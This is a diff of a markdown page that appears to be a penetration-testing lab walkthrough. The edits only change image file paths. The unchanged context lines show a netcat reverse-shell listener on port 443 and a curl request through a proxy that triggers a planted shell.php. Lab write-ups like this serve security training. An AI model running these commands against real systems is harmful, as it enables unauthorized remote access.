@@ -195,7 +195,7 @@ sudo rlwrap nc -lnvp 443
 curl --proxy http://192.168.75.189:3128 -s http://192.168.75.189:8080/shell.php
 ```
 
-<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Stable Shell
 
@@ -294,4 +294,4 @@ Execute exploit with command:
 
 ## Proofs
 
-<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>
